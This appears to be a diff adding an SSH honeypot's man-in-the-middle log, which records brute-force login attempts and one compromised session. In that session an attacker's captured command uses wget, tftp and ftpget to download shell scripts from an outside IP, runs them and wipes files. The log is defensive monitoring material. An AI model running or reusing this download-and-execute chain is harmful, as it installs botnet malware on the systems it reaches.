@@ -1,0 +1,35 @@
+2020-11-05 01:17:15.858 - [Info] MITM Version: 1.26
+2020-11-05 01:17:15.862 - [Info] Auto Access Enabled: true
+2020-11-05 01:17:15.862 - [Debug] [Init] Auto Access Barrier: true
+2020-11-05 01:17:15.876 - [Info] SSH man-in-the-middle server for 172.20.0.202 listening on 0.0.0.0:10001
+2020-11-05 01:17:16.477 - [Debug] [Connection] Attacker connected: 159.203.26.38 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-05 01:17:17.037 - [Debug] [Auth] Attacker 159.203.26.38 trying to authenticate with "password"
+2020-11-05 01:17:17.037 - [Debug] [Auto Access] Attacker: 159.203.26.38, Threshold: 1, Attempts: 1
+2020-11-05 01:17:17.038 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-05 01:17:17.038 - [Debug] [Auto Access] Adding the following credentials: "testuser:testuser"
+2020-11-05 01:17:17.554 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-05 01:17:17.554 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.202
+2020-11-05 01:17:17.558 - [Debug] [Connection] Attacker connected: 206.189.46.85 | Client Identification: SSH-2.0-libssh-0.6.3
+2020-11-05 01:17:17.635 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-05 01:17:17.794 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.87.1/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 157.230.87.1 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 157.230.87.1; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 157.230.87.1 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2020-11-05 01:18:18.695 - [Debug] [Connection] Client error on ssh server
+2020-11-05 01:18:18.696 - [Debug] [Connection] Attacker closed connection
+2020-11-05 01:18:18.700 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-05 01:18:18.701 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-05 01:18:45.668 - [Debug] [Connection] Attacker connected: 175.118.152.100 | Client Identification: SSH-2.0-libssh-0.6.3
+2020-11-05 01:18:46.912 - [Debug] [Auth] Attacker 175.118.152.100 trying to authenticate with "password"
+2020-11-05 01:18:46.912 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-11-05 01:18:46.913 - [Debug] [Auth] Attacker: 175.118.152.100 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-05 01:18:47.338 - [Debug] [Connection] Attacker closed the connection
+2020-11-05 01:20:15.668 - [Debug] [Connection] Attacker connected: 175.118.152.100 | Client Identification: SSH-2.0-libssh-0.6.3
+2020-11-05 01:20:16.924 - [Debug] [Auth] Attacker 175.118.152.100 trying to authenticate with "password"
+2020-11-05 01:20:16.924 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-11-05 01:20:16.925 - [Debug] [Auth] Attacker: 175.118.152.100 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-05 01:20:17.355 - [Debug] [Connection] Attacker closed the connection
+2020-11-05 01:21:45.048 - [Debug] [Connection] Attacker connected: 175.118.152.100 | Client Identification: SSH-2.0-libssh-0.6.3
+2020-11-05 01:21:46.308 - [Debug] [Auth] Attacker 175.118.152.100 trying to authenticate with "password"
+2020-11-05 01:21:46.308 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-11-05 01:21:46.309 - [Debug] [Auth] Attacker: 175.118.152.100 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-05 01:21:46.740 - [Debug] [Connection] Attacker closed the connection
+2020-11-05 01:22:19.004 - [Info] Exiting...
+2020-11-05 01:22:19.004 - [Debug] Cleaning up...
